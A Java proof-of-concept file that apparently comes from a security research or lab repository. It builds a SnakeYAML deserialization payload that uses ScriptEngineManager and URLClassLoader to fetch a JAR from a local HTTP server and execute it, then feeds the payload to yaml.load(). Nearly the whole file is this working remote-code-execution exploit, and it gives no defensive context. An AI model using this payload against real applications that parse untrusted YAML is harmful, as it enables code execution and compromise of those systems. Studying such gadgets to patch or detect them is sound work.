package cc.blbana.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

public class SnakePayloadRCE {
    /**
     * yaml-payload file
     * From Repo Url: https://github.com/artsploit/yaml-payload
     * @param args
     */
    public static void main(String[] args) {
        String PoC = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000/JavaDeserializationVulnerability-1.0-SNAPSHOT.jar\"]]]]";
        Yaml yaml = new Yaml();
        yaml.load(PoC);
    }
}
